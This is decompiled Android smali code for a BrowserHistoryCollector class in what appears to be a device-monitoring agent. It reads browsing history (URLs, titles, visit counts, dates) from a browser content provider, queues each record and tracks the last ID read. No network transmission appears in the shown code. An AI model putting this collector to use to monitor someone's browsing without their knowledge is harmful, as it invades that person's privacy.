.class public Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;
.super Ljava/lang/Object;
.source "BrowserHistoryCollector.java"


# static fields
.field protected static final TAG:Ljava/lang/String; = "BrowserHistoryCollector"

.field protected static working:Z = false


# instance fields
.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/BrowserHistoryData;",
            ">;"
        }
    .end annotation
.end field

.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected source:I

.field protected uri:Landroid/net/Uri;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>(ILandroid/net/Uri;Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(I",
            "Landroid/net/Uri;",
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/BrowserHistoryData;",
            ">;",
            "Lcom/hp/vd/context/Context;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 46
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 32
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 33
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->context:Lcom/hp/vd/context/Context;

    .line 34
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 35
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 47
    iput p1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->source:I

    .line 48
    iput-object p2, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->uri:Landroid/net/Uri;

    .line 50
    iput-object p3, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 51
    iput-object p4, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->context:Lcom/hp/vd/context/Context;

    .line 52
    iput-object p5, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 54
    iput-object p6, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public collect()V
    .locals 11

    .line 59
    sget-boolean v0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->working:Z

    const/4 v1, 0x3

    const/4 v2, 0x1

    if-ne v0, v2, :cond_0

    .line 60
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "BrowserHistoryCollector"

    const-string v3, "collect(): A collector is already working. Skipping data extraction."

    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 65
    :cond_0
    sput-boolean v2, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->working:Z

    .line 68
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    .line 70
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "max_history_id_"

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v4, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->source:I

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v4, 0x6

    .line 72
    new-array v5, v4, [Ljava/lang/String;

    const-string v4, "_id"

    const/4 v9, 0x0

    aput-object v4, v5, v9

    const-string v4, "url"

    aput-object v4, v5, v2

    const/4 v2, 0x2

    const-string v4, "title"

    aput-object v4, v5, v2

    const-string v2, "visits"

    aput-object v2, v5, v1

    const/4 v2, 0x4

    const-string v4, "date"

    aput-object v4, v5, v2

    const/4 v2, 0x5

    const-string v4, "created"

    aput-object v4, v5, v2

    const-string v2, "bookmark = 0 "

    .line 84
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, " AND _id > "

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {v2, v0}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 87
    :try_start_0
    iget-object v4, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->uri:Landroid/net/Uri;

    const/4 v7, 0x0

    const-string v8, "_id"

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v2
    :try_end_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_6
    .catch Landroid/database/SQLException; {:try_start_0 .. :try_end_0} :catch_5
    .catch Ljava/lang/SecurityException; {:try_start_0 .. :try_end_0} :catch_4
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    if-nez v2, :cond_1

    .line 127
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "BrowserHistoryCollector"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Cursor for "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->uri:Landroid/net/Uri;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v4, " is NULL so skipping this change."

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 133
    sput-boolean v9, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->working:Z

    return-void

    :cond_1
    const/4 v1, 0x0

    move-object v3, v1

    move v1, v9

    .line 143
    :goto_0
    :try_start_1
    invoke-interface {v2}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-eqz v4, :cond_3

    add-int/lit8 v1, v1, 0x1

    .line 146
    new-instance v4, Lcom/hp/vd/data/BrowserHistoryData;

    invoke-direct {v4}, Lcom/hp/vd/data/BrowserHistoryData;-><init>()V

    .line 148
    iget v5, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->source:I

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/BrowserHistoryData;->source:Ljava/lang/Integer;

    const-string v5, "_id"

    .line 149
    invoke-interface {v2, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v2, v5}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/BrowserHistoryData;->internalId:Ljava/lang/Integer;

    const-string v5, "url"

    .line 151
    invoke-interface {v2, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v2, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/BrowserHistoryData;->url:Ljava/lang/String;

    const-string v5, "title"

    .line 152
    invoke-interface {v2, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v2, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/BrowserHistoryData;->title:Ljava/lang/String;

    const-string v5, "visits"

    .line 154
    invoke-interface {v2, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v2, v5}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/BrowserHistoryData;->visits:Ljava/lang/Integer;

    .line 155
    new-instance v5, Ljava/util/Date;

    const-string v6, "date"

    invoke-interface {v2, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v2, v6}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v6

    invoke-direct {v5, v6, v7}, Ljava/util/Date;-><init>(J)V

    iput-object v5, v4, Lcom/hp/vd/data/BrowserHistoryData;->lastVisitOn:Ljava/util/Date;

    const-wide/16 v5, 0x0

    const-string v7, "created"

    .line 157
    invoke-interface {v2, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v2, v7}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v7

    cmp-long v10, v5, v7

    if-eqz v10, :cond_2

    .line 158
    new-instance v5, Ljava/util/Date;

    invoke-direct {v5, v7, v8}, Ljava/util/Date;-><init>(J)V

    iput-object v5, v4, Lcom/hp/vd/data/BrowserHistoryData;->createdAt:Ljava/util/Date;

    .line 162
    :cond_2
    iget-object v5, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-virtual {v5, v4}, Lcom/hp/vd/data/concurrency/BlockingQueue;->put(Ljava/lang/Object;)Z

    .line 164
    iget-object v4, v4, Lcom/hp/vd/data/BrowserHistoryData;->internalId:Ljava/lang/Integer;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-object v3, v4

    goto :goto_0

    .line 174
    :cond_3
    iget-object v4, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v5, "BrowserHistoryCollector"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Rows read: "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v4, v5, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 176
    invoke-interface {v2}, Landroid/database/Cursor;->close()V

    if-nez v3, :cond_4

    .line 179
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "BrowserHistoryCollector"

    const-string v2, "run(): no rows were found with the cursor."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 181
    sput-boolean v9, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->working:Z

    return-void

    .line 189
    :cond_4
    iget-object v1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {v1, v0}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    .line 192
    :try_start_2
    iget-object v2, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {v2, v0, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 194
    iget-object v2, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    .line 195
    iget-object v4, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v2, v4}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I

    .line 197
    iget-object v2, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "BrowserHistoryCollector"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "run(): commited "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, " = "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_1

    :catch_0
    move-exception v2

    .line 203
    iget-object v3, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v3, v0, v4}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 205
    iget-object v3, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "BrowserHistoryCollector"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "run(): could not commit "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ", reverting to the old value = "

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {v3, v4, v0, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 212
    :goto_1
    sput-boolean v9, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->working:Z

    return-void

    :catch_1
    move-exception v0

    .line 168
    iget-object v1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "BrowserHistoryCollector"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Exception caught read/write: maxId: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 170
    sput-boolean v9, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->working:Z

    return-void

    :catch_2
    move-exception v0

    .line 120
    iget-object v1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "BrowserHistoryCollector"

    const-string v3, "Exception caught"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 122
    sput-boolean v9, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->working:Z

    return-void

    :catch_3
    move-exception v0

    .line 114
    iget-object v1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "BrowserHistoryCollector"

    const-string v3, "IllegalArgumentException caught"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 116
    sput-boolean v9, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->working:Z

    return-void

    :catch_4
    move-exception v0

    .line 108
    iget-object v1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "BrowserHistoryCollector"

    const-string v3, "SecurityException caught"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 110
    sput-boolean v9, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->working:Z

    return-void

    :catch_5
    move-exception v0

    .line 102
    iget-object v1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "BrowserHistoryCollector"

    const-string v3, "SQLException caught while quering cursor"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 104
    sput-boolean v9, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->working:Z

    return-void

    :catch_6
    move-exception v0

    .line 96
    iget-object v1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "BrowserHistoryCollector"

    const-string v3, "NullPointerException caught while quering cursor"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 98
    sput-boolean v9, Lcom/hp/vd/module/monitor/browser/BrowserHistoryCollector;->working:Z

    return-void
.end method
